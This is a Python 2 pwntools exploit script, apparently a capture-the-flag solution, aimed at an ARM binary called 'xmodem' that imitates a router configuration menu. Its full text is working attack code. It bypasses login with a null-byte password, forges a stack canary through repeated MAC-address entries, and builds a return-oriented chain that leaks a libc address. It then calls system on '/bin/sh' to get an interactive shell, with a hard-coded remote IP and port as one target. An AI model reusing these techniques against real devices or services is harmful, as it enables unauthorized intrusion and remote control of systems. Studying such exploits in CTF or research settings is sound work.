#! /usr/bin/python2

from pwn import *
import sys


def exploit():
    # 0x00010ef4 : mov r2, sb ; mov r1, r8 ; mov r0, r7 ; blx r3
    # 0x00010f00 : pop.w {r3, r4, r5, r6, r7, r8, sb, pc}
    # 0x00010910 : mov sp, r7 ; pop {r7, pc}
    pop_gadget = 0x10f01
    changesp_gadget = 0x10911
    setreg_gadget = 0x10ef5

    # bypass authentication
    login('root', '\x00')

    # bypass canary
    addMAC('hello')
    addMAC('hello') 
    addMAC(p32(setreg_gadget))  # at 0x22070
    addMAC('aa' + '\xfe\xff\xff\xff')

    fake_canary = 0x61616161
    addMAC('a' * 8 + p32(fake_canary) + '\x00' * 8 + p32(fake_canary))

    # ROP
    ssid_addr = 0x22004
    pclose_got_addr = 0x21FF8
    popen_plt_addr = 0x1079C
    read_plt_addr = 0x1070C
    puts_plt_addr = 0x10754
    mode_addr = 0x10f3c

    rop = p32(pop_gadget) + p32(read_plt_addr) + p32(0) * 3 + p32(0x22070 - 4) + p32(0x22070) + p32(800) + p32(changesp_gadget)  # call read
    ssid(rop[:20])
    pw(rop[20:])
    wb = p16(changesp_gadget & 0xffff)
    newpw = p32(0) + p32(fake_canary) * 11 + p32(0) + p32(ssid_addr) + wb
    login('d4rkn3ss', newpw)

    rop = p32(0) * 8  # magic padding :v
    rop += p32(changesp_gadget + 2) + p32(0x22070 - 4 + 700) + p32(changesp_gadget)  # increase sp
    rop = rop.ljust(700, '\x00')
    rop += p32(pop_gadget) + p32(puts_plt_addr) + p32(0) * 3 + p32(pclose_got_addr) + p32(0) * 2 + p32(setreg_gadget + 4)  # call puts
    rop += p32(read_plt_addr) + p32(0) * 3 + p32(0) + p32(0x22350 - 4 + 36) + p32(100) + p32(setreg_gadget)  # call read

    r.sendlineafter('Wrong username or password!', rop)
    raw = r.recv(4)
    pclose_addr = u32(raw)
    libc_addr = pclose_addr - 0x4a6a1
    system_addr = libc_addr + 0x2c781
    sh_addr = libc_addr + 0xCA3E4
    log.info('Libc addr: ' + hex(libc_addr))

    r.sendline(p32(system_addr) + p32(0) * 3 + p32(sh_addr) + p32(0) * 2 + p32(setreg_gadget + 4))  # call system

    r.interactive()


def login(username, passwd):
    r.sendlineafter('Your choice: ', '1')
    r.sendlineafter('User name:', username)
    r.sendafter('Password:', passwd)


def info():
    r.sendlineafter('Your choice: ', '2')


def addMAC(mac):
    r.sendlineafter('Your choice: ', '3')
    r.sendlineafter('MAC address: ', mac)


def pw(newpw):
    r.sendlineafter('Your choice: ', '6')
    r.sendafter('New Wireless Password: ', newpw)


def ssid(newssid):
    r.sendlineafter('Your choice: ', '5')
    r.sendafter('New SSID: ', newssid)


if __name__ == '__main__':
    context.terminal = ['gnome-terminal', '-e']
    gdb_command = '''
        b *0x10f00
        c
    '''
    if len(sys.argv) == 1:
        exit()
    if sys.argv[1] == 'remote':
        r = remote('42.117.243.201', 9999)
        LOCAL = False
    elif sys.argv[1] == 'local':
        r = process('./xmodem', env={'LD_PRELOAD':'/usr/arm-linux-gnueabihf/lib/libc.so.6'})
        LOCAL = True
    elif sys.argv[1] == 'debug':
        r = gdb.debug('./xmodem', gdb_command, arch='arm', env={'LD_PRELOAD':'/usr/arm-linux-gnueabihf/lib/libc.so.6'})
    else:
        exit()
    exploit()
